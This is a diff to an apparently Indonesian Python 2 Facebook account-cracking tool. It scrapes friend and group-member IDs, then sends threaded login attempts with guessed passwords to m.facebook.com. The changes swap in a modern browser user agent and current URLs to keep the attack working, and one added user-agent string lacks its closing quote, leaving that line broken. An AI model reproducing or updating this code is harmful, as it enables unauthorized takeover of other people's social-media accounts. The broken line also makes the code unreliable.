@@ -37,7 +37,7 @@ br.set_handle_referer(True)
 br.set_cookiejar(cookielib.LWPCookieJar())
 br.set_handle_redirect(True)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36')]
 def bacaData():
 	global fid_bgroup,fid_bteman
 	try:
@@ -146,7 +146,7 @@ def login():
 	us = inputD('[?]Email/HP')
 	pa = inputD('[?]Kata Sandi')
 	tampil('\rh[*]Sedang Login....')
-	buka('https://web.facebook.com')
+	buka('https://m.facebook.com/')
 	br.select_form(nr=0)
 	br.form['email']=us
 	br.form['pass']=pa
@@ -154,7 +154,7 @@ def login():
 	url = br.geturl()
 	if 'save-device' in url or 'm_sess' in url:
 		tampil('\rh[*]Login Berhasil')
-		link = ses.get('https://mobile.facebook.com/home.php')
+		buka('https://m.facebook.com/')
 		nama = br.find_link(url_regex='logout.php').text
 		nama = re.findall(r'\((.*a?)\)',nama)[0]
 		tampil('\rh[*]Selamat datang \rk%s\n\rh[*]Semoga ini adalah hari keberuntungan mu....'%nama)
@@ -191,7 +191,7 @@ def saring_id_group0():
 	while 1:
 		id_group = inputD('[?]Id Group')
 		tampil('\rh[*]Mengecek Group....')
-		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
+		a = buka('https://m.facebook.com/groups_browse/your_groups/')
 		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
 		try:
 			next = br.find_link(url_regex= '/browse/group/members/').url
@@ -228,7 +228,7 @@ def idteman():
 		login()
 		if log == 0:
 			keluar()
-	saring_id_teman(buka('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
+	saring_id_teman(buka('https://m.facebook.com/friends/?target_pivot_link=friends'))
 	try:
 		next = br.find_link(url_regex= 'friends_center_main').url
 	except:
@@ -260,7 +260,7 @@ class mt(threading.Thread):
         return self.a,self.id
     def run(self):
         try:
-             data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
+             data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36}))
         except KeyboardInterrupt:
             os.sys.exit()
         except:
@@ -382,7 +382,7 @@ def menu():
             \rk*   *\rh /+/++//
              \ /  |/__//
            {\rmX\rh}v{\rmX\rh}|\rcPRX\rh|==========.
-             [']  /'|'\           \\
+             [']  /'|'\           \\arya shule
                  /  \  \           '
                  \_  \_ \_    \rk*\rhDragonFly ZomBie
 \rk###########################################################
@@ -404,3 +404,4 @@ def menu():
 		keluar()
 bacaData()
 menu()
+
